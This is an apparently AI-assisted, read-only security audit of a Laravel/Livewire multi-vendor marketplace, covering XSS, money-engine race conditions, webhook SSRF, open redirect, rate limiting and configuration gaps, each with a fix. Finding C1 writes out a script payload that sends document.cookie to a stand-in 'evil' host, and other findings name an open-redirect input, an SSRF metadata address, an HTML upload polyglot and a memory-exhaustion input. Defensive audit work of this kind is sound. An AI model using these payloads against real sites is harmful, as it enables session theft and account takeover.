# HalalBizs 2.0 — Whole-Repo Audit
**Date**: 2026-07-27 · **HEAD**: `29ee7d1` (#48) · **Mode**: read-only, report-only
**Scope**: Laravel 13 / Livewire 4 multi-vendor marketplace — routes, middleware, 103 Livewire components, 53 services, models/migrations, blade/Alpine, jobs/events, config, tests.
**Method**: 6 parallel lens agents (routes+Livewire security · money engine · data+perf · payments+webhooks · view+config+tests · **config/middleware/infra deep-dive**); CRITICAL/HIGH + the strongest config findings re-verified by hand against source.

---

## 1. Executive summary (worst first)

1. **Two stored-XSS holes on the product-detail page — CRITICAL, exploitable by any approved seller.** The JSON-LD block breaks out of `<script>` because `json_encode` omits `JSON_HEX_TAG`; the product description keeps event-handler attributes because `strip_tags` doesn't strip them. Either lets a seller run script in every buyer's **and admin's** session → session/account takeover. **These are the only exploitable-now findings.**
2. **The money engine is tight on the checkout side and loose on the settlement side.** Checkout is exemplary — one transaction, correct lock order, no oversell. Every concurrency/atomicity gap is *after* the sale: refund cap read outside its lock (double-refund under an admin race), status-completion racing the auto-complete cron (double ledger booking), and the ledger write living in a separate transaction from the status change (a throw strands a Completed order with no seller credit, unrecoverable).
3. **Payment fulfilment is well-designed but its safety is *borrowed*.** iPay88 signature is timing-safe, requery is the source of truth, ResponseURL never fulfils, CSRF-exempt routes are all gated. But `ConfirmIpay88PaymentJob` has no row lock and no retry policy — double-fulfilment is prevented only because every downstream listener happens to be idempotent, and a transient requery failure strands the payment in manual review.
4. **The outbound webhook layer loses events and is a latent SSRF.** Dedupe is claimed at dispatch, so 3 failed tries permanently block redelivery; no timeout/backoff/`failed()`/observability; the target URL is unvalidated (safe only because no seller webhook-create UI ships yet).
5. **Two index gaps and one uniqueness gap will bite at scale**, not now: the hottest page (storefront listing) filesorts for lack of `(status, published_at)`/`(status, sold_count)` composites, and platform-voucher codes aren't actually unique (`unique(store_id, code)` with NULL `store_id`).
6. **Admin authorization has no separation of duties below superadmin** — any admin with `settings.manage` can grant themselves any other permission. Intended per the code, but worth an explicit decision.
7. **Everything else is disciplined and clean.** Tenant scoping via `CurrentStore` is consistent, IDOR is systematically closed, mass-assignment of privilege columns is blocked by explicit-array discipline, no committed secrets, and the critical money paths carry adversarial + concurrency tests (the stress battery). The gaps are real but bounded.

---

## 2. Findings by severity

### CRITICAL

**C1 · Stored XSS — JSON-LD `</script>` breakout via product name**
`resources/views/livewire/storefront/product-detail.blade.php:13`
`{!! json_encode($jsonLd, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE) !!}` is emitted inside `<script type="application/ld+json">`. The flags omit `JSON_HEX_TAG`, and `$jsonLd['name']` is the raw seller product name (`ProductDetail.php:240`), which is only `trim()`ed on save — **not** sanitized (`Seller/Products/Form.php:475`; note the description IS sanitized there, the name is not). A product name of `</script><script>fetch('//evil/?c='+document.cookie)</script>` escapes the element and executes with **zero interaction** on every visitor's and admin's PDP view.
*Why it matters*: seller → cross-tenant session/account takeover, including admins who open the product. This is a genuine now-exploitable auth-boundary break.
*Fix*: add `JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT` to the `json_encode` flags, or replace the whole line with `@json($jsonLd)`.

**C2 · Stored XSS — product description keeps event-handler attributes**
`app/Livewire/Seller/Products/Form.php:472` → rendered at `resources/views/livewire/storefront/product-detail.blade.php:301`
Descriptions are "sanitized" with `strip_tags($html, '<p><br><ul><ol><li><strong><em>')` and rendered `{!! … !!}`. `strip_tags` removes disallowed *tags* but never *attributes* on allowed tags, so `<em onmouseover="…"> `, `<strong onclick="…">`, or a `style` payload survives and fires on interaction on the highest-traffic buyer page.
*Why it matters*: same seller-controlled stored XSS as C1; requires interaction (hover/click) but is otherwise identical in blast radius. `strip_tags` is not an XSS sanitizer.
*Fix*: run descriptions through a real allow-list sanitizer that also strips attributes (e.g. `mews/purifier`, or a tightly-configured HTML sanitizer) before persist. (Package add → note in the PR per Hard Rule 10.)

### HIGH

**H1 · Refund TOCTOU → concurrent double/over-refund of real cash**
`app/Services/RefundService.php:48-58`
`$alreadyRefunded = (int) $subOrder->refunded_sen` (`:48`) and the cap `$sellerRefundable = max(0, $total - $alreadyRefunded)` (`:49`) are read **outside** the `DB::transaction` (`:58`), and the sub-order row is never `lockForUpdate`'d. Two concurrent refunds (admin double-click, or a manual refund racing the automated return-refund) both read `refunded_sen = 0`, both pass the cap, both call the gateway `->refund()` (`:97`) and both `increment('refunded_sen')` (`:109`). Sequential calls are safe; only concurrency breaks it.
*Fix*: re-fetch the sub-order with `lockForUpdate()` as the first statement **inside** the transaction and recompute the cap from the locked row.

**H2 · Double completion → double ledger booking (no row lock + no DB backstop)**
`app/Services/SubOrderStatusService.php:39-64` + `app/Services/LedgerService.php:42` + `payouts` migration
`transition()` reads `status`, checks `canTransition()`, then `save()`s with no `lockForUpdate` and no re-read. The buyer's `confirmReceived()` (`OrderService.php:110-113`, no wrapping transaction) can race the hourly `orders:auto-complete` cron (`AutoCompleteDeliveredOrders.php:26-29`): both see `delivered`, both transition to `Completed`, both fire `SubOrderStatusChanged`, both run `recordCompletion()`. Its idempotency guard `ledgerEntries()->where('type', Sale)->exists()` is not under a lock, and there is **no unique constraint** on `store_ledger_entries(sub_order_id, type)`, so both pass and the seller is credited twice.
*Fix*: `lockForUpdate` the sub-order at the top of `transition()` and re-read status inside; add a unique index on `store_ledger_entries(sub_order_id, type)` (for Sale/Commission) as a hard backstop.

**H3 · Completion settlement is split across two transactions → unrecoverable un-credited sale**
`app/Listeners/RecordLedgerOnCompletion.php:16-21` + `app/Services/OrderService.php:110-113` + `SubOrderStatusService.php:54-61`
`confirmReceived` (and the auto-complete cron) call `transition()` with no outer transaction, so the `Completed` status commits first; the **synchronous** `RecordLedgerOnCompletion` listener then books the ledger in its own `DB::transaction`. If that throws, the sub-order is already `Completed` — a terminal-ish state whose only exit is `ReturnRequested`, never back to `Completed` — so the Sale/Commission entries are permanently unwritten and un-rerunnable, and later sync listeners (notifications, webhooks) are skipped. Its siblings (`AwardCoinsOnCompletion`, `RecordAffiliateCommissionOnCompletion`) are correctly `ShouldQueue` + try/catch; this one is not.
*Fix*: wrap the transition + ledger write in one transaction, **or** make `RecordLedgerOnCompletion` `ShouldQueue` (it is already idempotent, so retry is safe).

### MEDIUM

**M1 · `transition()` status + history not atomic when the caller doesn't wrap**
`app/Services/SubOrderStatusService.php:54-59` — the status `save()` and `writeHistory()` are two statements with no internal transaction; callers that don't wrap (`confirmReceived`, `AutoCompleteDeliveredOrders`) can leave a status with no history row, violating Hard Rule 2. *Fix*: wrap save + history + dispatch in `DB::transaction` inside `transition()` itself (also closes H1/H2's atomicity edge).

**M2 · `ConfirmIpay88PaymentJob` has no row lock**
`app/Jobs/ConfirmIpay88PaymentJob.php:34-36` — reads `$payment->fresh()->status` with no `lockForUpdate`. iPay88 retries BackendURL; two near-simultaneous callbacks both pass the `!== Success` check before either commits, dispatching `OrderPaid` twice. No double-book *today* only because every downstream listener is idempotent — the safety is borrowed. *Fix*: `Payment::whereKey($id)->lockForUpdate()` and re-check status under the lock inside the transaction.

**M3 · `ConfirmIpay88PaymentJob` has no retry policy**
`app/Jobs/ConfirmIpay88PaymentJob.php:21-31` + `Ipay88Service.php:126` — no `$tries`/`$backoff`/`failed()`, and `requery` does an un-timed `Http::post`. A transient network error at default `tries=1` permanently fails the job; the buyer paid but the order sits `Pending` awaiting manual admin review. Fail-closed (never over-fulfils) but no auto-recovery. *Fix*: add `$tries`/`backoff()` + `->timeout()` on the requery call.

**M4 · Outbound webhook dedupe claimed at dispatch → permanent event loss + no resilience**
`app/Services/WebhookDispatcher.php:24-36` + `app/Jobs/SendWebhookJob.php:40` — the `WebhookDelivery` dedupe row is `insertOrIgnore`-claimed before the job runs, so if all 3 tries fail the row stays and blocks any future redelivery (event silently lost). Also: no `backoff`, no `failed()`, no `->timeout()` on the POST (a hanging seller endpoint ties up the `webhooks` worker), and the row stores no status/response (zero observability). *Fix*: claim on **success** (or store status + allow retry), add `->timeout()` + `backoff()`, record the delivery outcome.

**M5 · Webhook SSRF (latent)**
`app/Jobs/SendWebhookJob.php:40` + `WebhookSubscription.url` (`$fillable`) — the target URL is POSTed with no scheme/host allow-list; nothing blocks `http://169.254.169.254/…`, localhost, or RFC1918. No seller-facing subscription-create UI exists today, so it's latent — but the moment a "add webhook" form ships it's live SSRF. *Fix*: validate URL on write (public https, block private/link-local ranges) and re-check at send time.

**M6 · Storefront listing missing composite indexes → filesort on the hottest page**
`database/migrations/2026_06_12_100010_create_products_table.php` — `Listing.php:339,343` filters `status='live'` then `orderByDesc('published_at')` / `orderByDesc('sold_count')`, but only a single-column `status` index exists, so MySQL filesorts every catalog/category page under load. *Fix*: add `index(['status','published_at'])` and `index(['status','sold_count'])`.

**M7 · Platform-voucher code uniqueness gap**
`database/migrations/2026_06_12_100030_create_vouchers_table.php:28` + `VoucherService.php:164-180` — `unique(['store_id','code'])` doesn't dedupe platform vouchers because `store_id` is NULL and SQL treats NULLs as distinct. `lookup()` fetches candidates (plural) by code and picks `first()`, so two platform vouchers sharing a code both persist and resolve arbitrarily. *Fix*: partial/generated-column unique on `code` where `scope='platform'`, or dedupe-guard the admin create path.

**M8 · Admin permission self-grant — no separation of duties**
`app/Livewire/Admin/System/Staff.php:91-118` — any admin who can reach `/admin/system/staff` (gated only by `can:settings.manage`) can grant **any** permission to **any** admin, including themselves (no self-exclusion). Superadmin is the only real boundary. Appears intended, but a `settings.manage` admin can escalate to `finance.manage`/`orders.manage` at will. *Fix (if undesired)*: exclude `auth()->id()` from `editPermissions`/`savePermissions`, or gate staff-permission editing behind superadmin.

**M9 · Public disk media — SVG XSS (needs verification)**
`config/filesystems.php` `public` disk is `visibility: public` with no MIME restriction. Product images go through Spatie Media Library; whether the `images` collection **rejects SVG** was not confirmed. If a seller can upload an SVG to the public disk, opening its URL directly executes inline script. *Fix*: confirm the media collection's accepted-mime list; if SVG is allowed, block it or serve docs/media with `Content-Disposition: attachment`.

**M10 · Commission can exceed sale credit under GROSS basis (by design — no floor/alert)**
`app/Services/LedgerService.php:98-101` — under `CommissionBasis::Gross`, the base is pre-discount `list_price_sen` while the sale credit is net of the seller's shop voucher, so a deep shop voucher drives the balance negative. Documented as intentional ("your discount is your own marketing spend") and consistent with the "negative balance = debt" policy — flagged only because there is no alert when a completion pushes a balance negative. *Fix (optional)*: emit an admin alert on a completion that crosses zero, or clamp if the policy changes.

### LOW

- **L1 · Seller order actions re-authorize only in `mount()`** — `Seller/Orders/Detail.php:35-41`; `public SubOrder $subOrder` has no `#[Locked]` and the action methods don't re-assert `authorizeStore()`. Safe today via Livewire snapshot signing (PK can't be swapped); add `#[Locked]` + per-action re-check as belt-and-suspenders.
- **L2 · Public Eloquent-model props without `#[Locked]`** across `Storefront\Account\OrderDetail`, `ReviewOrder`, `Admin\Orders\Detail`, `Admin\Sellers\StoreDetail`, `GroupBuy\Team`, `Live\Room`, `ProductQuestions` — all ownership-check in `mount()`, not exploitable, but `#[Locked]` is the documented hardening.
- **L3 · `Store`/`User` `$fillable` include privilege columns** (`Store.commission_rate/status/user_id`, `User.status`) — protected only by every call site building explicit arrays. One future `->update($request->all())` re-opens self-set-commission. Drop them from `$fillable`; set explicitly in the admin/service paths.
- **L4 · ShopAssistant replays client-controlled transcript, no rate limit** — `Storefront/ShopAssistant.php:23,40-55`; `public array $history` is frontend-mutable and fed to the LLM with no throttle on `send()`. Abuse/cost + prompt-injection of forged assistant turns; no data leak (recommendations re-filtered to `live()`). Rate-limit `send()`; don't trust client-supplied assistant turns.
- **L5 · EasyParcel webhook trusts an unsigned body `status` with a body-carried token** — `EasyParcelWebhookController.php:22-45`; token gate is correct (`hash_equals`, fails closed) but anyone who learns the token can force `delivered` (→ COD settlement). Bounded (only advances `Shipped`, idempotent). Prefer a header token + HMAC over the body.
- **L6 · GroupBuy team expiry full-scans** — `group_buy_teams` has `(group_buy_id, status)` but the cron filters `status + expires_at`; add `index(['status','expires_at'])`. Same shape (smaller) on `orders.expires_at` / `sub_orders.auto_complete_at`, already mitigated by a selective pre-filter.

---

## 3. Engine deep-dive — checkout · ledger · commission

**Atomicity.** Checkout is exemplary: `CheckoutService::place` wraps the whole flow — variant lock, stock decrement, flash `sold_qty`, group-buy burn, voucher `used_count`, wallet redemption, and all order/sub-order/item/payment inserts — in one `DB::transaction` (`:77-483`). There is **no stock-decremented-but-no-order** seam. The seam is entirely on the **settlement side**: the status change and `recordCompletion` run in *different* transactions because completion is driven through a synchronous listener with its own transaction while the completing callers don't wrap (H2/H3/M1).

**Concurrency.** Checkout's limited resources are correctly guarded by `lockForUpdate` in a consistent order (variants→flash→group-buy→vouchers→wallet): stock (`:92`), flash (`:99`), group memberships (`:104`), voucher rows (`VoucherService.php:172`), coin wallet + FIFO lots (`CoinService.php:73,327`). No oversell/over-redeem under load, and the uniform order avoids deadlock. The unguarded surfaces are all **outside** checkout: `transition()` (H2) and `RefundService` (H1).

**Idempotency.** Payment confirm is solid — controller short-circuits on `Success` (`Ipay88Controller.php:159`), the job re-checks `fresh()->status` (`:36`), gated on a real requery `'00'`. Coin earn/refund are idempotent on `(type, reference)` under the wallet lock. `recordCompletion` and `RefundService` are idempotent **sequentially** but not **concurrently** (H1/H2) — the only real idempotency gaps, both closable with a row lock + the ledger unique index.

**Correctness.** Money is integer sen throughout; rounding is consistent half-up integer math (commission `intdiv(base*bp + 5000, 10000)`; proportional reversals carry `+ intdiv(total,2)`); voucher proration uses largest-remainder so parts sum to the total; stacked discounts are capped to subtotal; coins leave ≥1 sen payable; stock has an underflow floor. The one correctness edge is commission > sale credit under GROSS (M10) — real but deliberately chosen.

**Verdict**: the checkout money engine is tight. Concentrate remediation on the post-sale settlement layer — a row lock on `transition()` and `RefundService`, one transaction spanning status+ledger (or a queued ledger listener), and a `(sub_order_id, type)` unique backstop.

---

## 4. Design-principles review (cost, not dogma)

The codebase is **genuinely well-architected** — flag only the items with real cost:

- **SRP / thin-Livewire — followed.** Money logic lives in services, components stay thin, snapshots are respected. No god-components found on the money path.
- **Authorization is decentralized (maintainability cost, MEDIUM).** No central Policies dir — authz is spread across route middleware + inline `abort_unless()` in components + `CurrentStore` scoping. It's *consistent*, but there's no single place to audit tenant isolation, which is exactly why C1/C2-class issues (and M8) are easy to miss. Consider consolidating the seller/buyer ownership checks into Policies over time — not urgent.
- **The settlement seam (design cost, HIGH — see H3).** Booking the ledger via a *synchronous* listener outside the status transaction is the one place where the "services own atomic money" principle isn't actually enforced by a transaction boundary. This is a structural cause, not a one-off bug.
- **No over-abstraction.** No premature interfaces/factories; DRY is applied to genuine duplication. The `PaymentGateway` manager + `EInvoiceProvider` contract are justified (multiple real drivers). Nothing to delete for bloat.

---

## 5. Test-coverage gaps

Critical money/authz paths are **well covered including adversarial + concurrency cases** (the `tests/Feature/Stress/` battery: `PaymentFsmStockStressTest`, `RefundLedgerStressTest`, `AuthzIdorStressTest`; plus `Ipay88Test`, `CommissionResolverTest`, `LedgerServiceTest`, `CheckoutServiceTest`, `TwoFactorTest`). Genuine gaps:

- **No XSS/output-encoding test** anywhere — C1/C2 would have no regression guard even after a fix. Add a feature test asserting a `</script>`-laden product name is escaped in the PDP HTML.
- **Voucher quota under concurrency** — `VoucherServiceTest`/`VoucherStackingTest`/`VoucherRedeemableTest` cover logic but no parallel-checkout race proving quota can't be over-redeemed (Hard Rule 3 demands atomic consume). *Needs verification against the stress suite.*
- **Coin double-spend under concurrency** — logic tested, no simultaneous-checkout balance-debit race.
- **Refund concurrency (H1)** and **double-completion (H2)** — the stress suite tests double-refund/double-book *sequentially*; neither has a true parallel-call test, which is exactly where the row-lock gaps live.
- **Stripe rail** — `card_intl launch:false`, no `StripeTest`; acceptable pre-go-live.

---

## 6. Quick wins (highest value per effort)

1. **C1** — one-line: swap the PDP JSON-LD to `@json($jsonLd)` (or add `JSON_HEX_TAG…`). ~5 min, closes a now-exploitable XSS.
2. **H2 backstop** — add a unique index on `store_ledger_entries(sub_order_id, type)`. One migration; makes double-booking impossible at the DB even before the code fix.
3. **M6** — two composite indexes on `products`. One migration; removes filesort on the busiest page.
4. **C2** — swap `strip_tags` for a real HTML sanitizer on description save. Package add, but self-contained.
5. **H1 / H3 / M1** — the settlement-layer fix (row locks + one transaction, or queued ledger listener) — one focused session; closes the entire post-sale concurrency class.

---

---

## 7. Additional-lens findings (config/infra + deep Livewire)

Two deeper lenses (a config/middleware/infra pass and a full 47-component storefront+auth pass) added the findings below. New items only — duplicates of §2 (C1/C2, ShopAssistant L4, model-prop `#[Locked]`) are not re-listed. The strongest (★) were hand-verified against source.

**Reconciliation of §2 uncertainties:**
- **M9 (public-disk SVG) — CLOSED as a non-vector for product images.** Laravel 13's `image` rule rejects SVG unless `image:allow_svg` is set (it isn't). *Replaced by* AL-M2 below (client-filename `.html` on buyer uploads), which is the real public-disk active-content vector.
- Livewire v4 signs the model class+key in the snapshot checksum, so the §2 L1/L2 model-prop concerns are confirmed **not exploitable** — they remain LOW hardening only.

### Config / middleware / infrastructure

- **★AL-C1 · Open redirect on the affiliate share link · MEDIUM · `app/Http/Controllers/AffiliateReferralController.php:21`** — `str_starts_with($to,'/')` passes a protocol-relative `//evil.com`; `redirect($target)` then sends `Location: //evil.com` → offsite. `/r/{code}` is unauthenticated, uncached, and forwards even for unknown codes. *Fix*: reject `$to` whose 2nd char is `/` or `\`, or `parse_url` and require empty scheme AND host.
- **★AL-C2 · Security headers only ship on the 200 path · MEDIUM · `bootstrap/app.php:37` + `SecurityHeaders.php`** — `SecurityHeaders` is `web(append:)` = innermost, so 404 / 419 / route-model-binding-miss / unmatched-URI responses return with no CSP, X-Frame-Options, nosniff, or HSTS. The file's own comment (`:40-43`) documents this exact inner/outer mechanic for `HandleUrlRedirects` — the header middleware was just left appended. `SecurityHeadersTest` only asserts the 200 path. *Fix*: move `SecurityHeaders` to `web(prepend:)` (or global); assert a 404 + 419 in the test.
- **★AL-C3 · Admin alert notifications leak finance data past the per-person gate · MEDIUM · `app/Observers/AdminAlertObserver.php:78,43`** — every alert fans out to **all** admin-role users, and the payout-alert body carries the ringgit amount (`Money::format($amount_sen)`). A CMS-only admin who is 403'd from `admin.finance.payouts` reads the amount in their bell. Undoes the effort the dashboard makes to gate finance out of its snapshot (#40/#41 least-privilege). *Fix*: give each alert an owning permission and filter recipients with `->filter(fn($u)=>$u->can($perm))`, or drop the amount from the body.
- **AL-C4 · No trusted-proxy config behind a TLS-terminating proxy · MEDIUM · `bootstrap/app.php` (no `trustProxies`)** — `AppServiceProvider` forces HTTPS URL generation but `TrustProxies` is unset, so `$request->secure()` is false in prod → the HSTS branch (`SecurityHeaders.php:54`) **never fires**, and the `api` limiter keyed on `$request->ip()` collapses to one global 60/min bucket (or is proxy-spoofable). *Fix*: `$middleware->trustProxies(at:…, headers:…)`. *Needs verification*: whether cPanel/LiteSpeed terminates TLS in-process.
- **AL-C5 · Admin route group omits `verified` (seller group has it) · MEDIUM · `bootstrap/app.php:27` vs `:22`** — `EnsureAdmin` checks role + 2FA but not email verification, so an admin with `email_verified_at = null` reaches the whole panel; email-method 2FA then delivers to an unproven address. *Fix*: add `'verified'` to the admin group, or force-verify on Staff creation. *Needs verification*: whether `Admin\System\Staff` sets `email_verified_at`.
- **AL-C6 · Unauthenticated write/compute endpoints have no rate limit · MEDIUM · `routes/web.php:30,31,43,45,111`** — only `api.php` carries a throttle. `POST /newsletter` unbounded `firstOrCreate` (mailing-list poisoning), `/search` runs Scout per guest, `/search/visual` accepts 8 MB + embedding per submit, `/r/{code}` DB-increments per hit (free click fraud). *Fix*: `throttle:` per route, keyed by IP for guests.
- **AL-C7 · Registration has no rate limiter; Turnstile is a no-op unkeyed · MEDIUM · `Storefront/Auth/Register.php:40-56` + `Turnstile.php:20-22`** — unlike Login/ForgotPassword/2FA, `register()` has no `RateLimiter`, and Turnstile returns `true` when unconfigured (dormant in the current build). Unbounded account creation + verification-email spend + an account-existence oracle via `unique:users,email`. *Fix*: IP-keyed limiter mirroring Login; fail-closed Turnstile passthrough outside local.
- **AL-C8 · Google OAuth links to a local account by email without checking `email_verified` · MEDIUM · `GoogleAuthController.php:44-45`** — falls back to `User::where('email', …)` and force-fills `google_id` + `email_verified_at` + logs in, never reading Google's `email_verified` claim. Low real-world exploitability (2FA blunts the admin path) → hardening. *Fix*: require `email_verified === true` before the email-based link.
- **AL-C9 · Login throttle is per-(email,IP) only · MEDIUM · `Login.php:121`** — one composite bucket means password-spraying one password across many emails from one IP never trips it (classic credential-stuffing shape); compounded by AL-C4's IP concern. *Fix*: add a coarser per-IP and per-email limiter alongside.
- **AL-C10 · `store_subdomain_base` falls back to the dev hostname in prod · MEDIUM · `config/app.php:58`** — defaults to `halalbizs2.0.test`; if `STORE_SUBDOMAIN_BASE` is unset on the server (absent from `.env.example`) the wildcard store route binds to `.test`, baked in by `route:cache`. Silent dead feature. *Fix*: default to `parse_url(config('app.url'), PHP_URL_HOST)` / skip the group when unset.
- **AL-C11 · Session cookie has no `Secure` flag by default; no prod guidance · MEDIUM(cutover) · `config/session.php:172`** — `SESSION_SECURE_COOKIE` is absent from `.env.example`, `deploy.sh`, and docs/10; with HSTS also not shipping (AL-C4) nothing forces the auth cookie off plaintext HTTP. *Fix*: set `SESSION_SECURE_COOKIE=true` on the server + document it + assert in `deploy.sh`.
- **AL-C12 · `.env.example` is stock — omits the app's own env surface · MEDIUM(cutover) · `.env.example`** — missing `IPAY88_ALLOW_MOCK`, `EASYPARCEL_*`, `EINVOICE_*`/`MYINVOIS_*`, `STORE_SUBDOMAIN_*`, `SESSION_SECURE_COOKIE`, `SCOUT_*`, `ANTHROPIC_API_KEY`, etc.; ships `APP_DEBUG=true`/`LOG_LEVEL=debug` (debug itself is covered by `deploy.sh` fail-closed). No machine-readable cutover source of truth. *Fix*: add a commented production section listing every app-owned key + safe value.
- **AL-C13 (LOW)** iPay88 `backend()` has no config gate, so a blank `merchant_key` makes its signature computable by anyone — bounded by requery (can't mint a paid order) but can flip a genuinely-pending payment to `Failed` (`Ipay88Controller.php:147,170`). `abort(404)` when `blank(merchant_key)`.
- **AL-C14 (LOW)** `SetDisplayCurrency.php:24` writes the session unconditionally every request → a `sessions` row + `Set-Cookie` for every guest/bot hit (DB session driver), defeats CDN caching. Write only when changed (mirror `SetLocale`).
- **AL-C15 (LOW)** EasyParcel webhook reads the token via `$request->input('token')` (`EasyParcelWebhookController.php:24`) → a `?token=` lands in access/CDN logs. Read from a header or `->post()` only.
- **AL-C16 (LOW)** CSP omits `frame-ancestors` and `form-action` (`SecurityHeaders.php:40-44`) — framing rests on the deprioritised `X-Frame-Options`, and form POST to any origin is permitted. Add `frame-ancestors 'self'` + `form-action 'self' <ipay88 hosts>`.
- **AL-C17 (LOW)** `config/livewire.php:19` `preview_mimes` includes `svg` — Livewire serves temp-upload previews inline same-origin; bounded (short-lived unguessable URL) but drop `svg`.

### Deep Livewire (storefront + auth)

- **★AL-M1 · ShopAssistant is an unauthenticated LLM cost/abuse channel · HIGH once the API key is live · `Storefront/ShopAssistant.php:30`** — rendered on every guest storefront page; `send()` has no auth, no rate limit, and replays the fully client-mutable `public array $history` verbatim into the Anthropic API (up to 5 `createMessage` calls/invocation). Once `services.anthropic.key` is set in prod = a direct unauthenticated billing attack + forged-assistant-turn injection. (This is §2 L4, upgraded on the "rendered for every guest + unbounded history" evidence.) *Fix*: `RateLimiter` on `send()` + a hard cap on history turns/length; don't trust client assistant turns.
- **★AL-M2 · Buyer uploads keep the client filename+extension → arbitrary type on the public disk · MEDIUM · `Account/ReviewOrder.php:143`, `Account/OrderDetail.php:137-139`** — `usingFileName($photo->getClientOriginalName())`; media-library blocks only PHP-family extensions, not `.html`/`.htm`, and `MEDIA_DISK` defaults to public. The `image` rule validates content, not the name, so a `GIF89a…<script>` polyglot uploaded as `x.html` is served `text/html` from the app origin (victim must open the URL directly → MEDIUM). *Fix*: derive the extension from the validated file, not the client name.
- **★AL-M3 · Group-buy price survives the campaign window · MEDIUM(money) · `GroupBuyService.php:99-102`** — `lockRedeemableFor` filters `group_buys.status = Active` only, never `starts_at`/`ends_at`, and no cron flips the deal status (`group-buy:expire` expires *teams*). An unlocked-team member checks out at `group_price_sen` indefinitely after the deal ends. *Fix*: add the `starts_at`/`ends_at` window to the query (mirror `scopeLive()`), or a status-flip on expiry. *Needs verification*: confirm no scheduled job flips `group_buys.status`.
- **AL-M4 · No server-side idempotency on `placeOrder` → duplicate orders · MEDIUM · `Storefront/Checkout.php:145` + `CheckoutService.php:86,94`** — only guard is client-side `wire:loading.attr=disabled`; the cart lines are read *before* the variant `lockForUpdate`, so two scripted concurrent submits can both pass and produce two orders/decrements/payments for one cart. *Fix*: an idempotency key / lock on cart or order creation.
- **AL-M5 · Unbounded, unlocked pagination props → single-request memory DoS · MEDIUM · `ProductReviews.php:26`, `ProductQuestions.php:24`, `Listing.php:82`, `StorePage.php:18`, `RecommendedProducts.php:30`** — none `#[Locked]` or clamped, all feed `take()`; `$wire.set('perPage', 5000000)` on a public page exhausts a worker. *Fix*: `#[Locked]` + clamp each.
- **AL-M6 · SMS pumping via phone verification · MEDIUM · `Account/Profile.php:323`** — `sendPhoneCode()` force-fills any client MSISDN and sends an SMS; `OtpService` throttles 1/min per-user-per-purpose with no daily cap and no phone-uniqueness, so one account can pump ~1,440 SMS/day at arbitrary numbers on the platform's bill (dormant until the SMS provider is keyed). *Fix*: daily cap + per-number rate limit + a verified-uniqueness check.
- **AL-L1 (LOW)** Voucher quota/per-user-limit double-burn: the same shop free-shipping code set in both `$appliedShopCode` and `$appliedShippingCode` (neither `#[Locked]`) writes two `voucher_usages` rows + double `used_count` for one order (`Checkout` + `CheckoutService.php:312-314`). No buyer gain; accounting is wrong. `#[Locked]` the code props / dedupe before consume.
- **AL-L2 (LOW)** `sellerNotes` is silently discarded — `Checkout.php:162` passes it but `CheckoutService::place`'s closure omits it from `use()` (`:77`); live in the buyer UI with no length validation. Wire it through or remove the input.
- **AL-L3 (LOW)** `ProductReviews::markHelpful` (`:65-71`) — `attach/detach` + separate `increment` outside a transaction; double-click drifts `helpful_count`, concurrent attach throws on the unique pivot. Wrap in a transaction / use `syncWithoutDetaching`.
- **AL-L4 (LOW)** `Account/Messages.php:141` renders `Product::find($contextProductId)` in `render()` with no store/live scope (unlike the scoped `send()` at `:95`) → display-only leak of any product's name/image, incl. unpublished.
- **AL-L5 (LOW)** TOTP codes have no used-code memo → replayable inside their ±1 window (`Auth/TwoFactorChallenge`). Memo the last-used code/counter per user.
- **AL-L6 (LOW)** Guest-reachable 32 MB temp uploads (`config/livewire.php:15` global `file|max:32768`, no mime) via unauthenticated `/search/visual`; the `image|max:8192` check runs after landing. Bounded by 24 h cleanup. Tighten the global temp rule.

*Trusted-device feature (#46) audited independently — sound: `Str::random(64)` stored bcrypt-hashed, checked with `Hash::check` + UA/24-IP fingerprint, httpOnly+encrypted cookie, password reset revokes all. No flaw.*

**Revised totals: 2 CRITICAL · 4 HIGH (H1–H3 + AL-M1) · ~22 MEDIUM · ~19 LOW.** The two CRITICALs and the settlement-layer HIGHs remain the priority; the config lens adds one genuinely new exploitable-ish item (AL-C1 open redirect) and a cluster of prod-cutover hardening; the Livewire lens adds AL-M2 (public-disk `.html`) and AL-M3 (group-buy money leak) as the standouts.

---

*Read-only audit. Nothing was changed. Prioritisation is Haze's call.*
*Report also copied to `library/codebase/halalbizs2.0-audit-2026-07-27.md` (survives repo resets).*
*Seven parallel lenses; §1–§6 from the first five, §7 from the config/infra + deep-Livewire passes.*
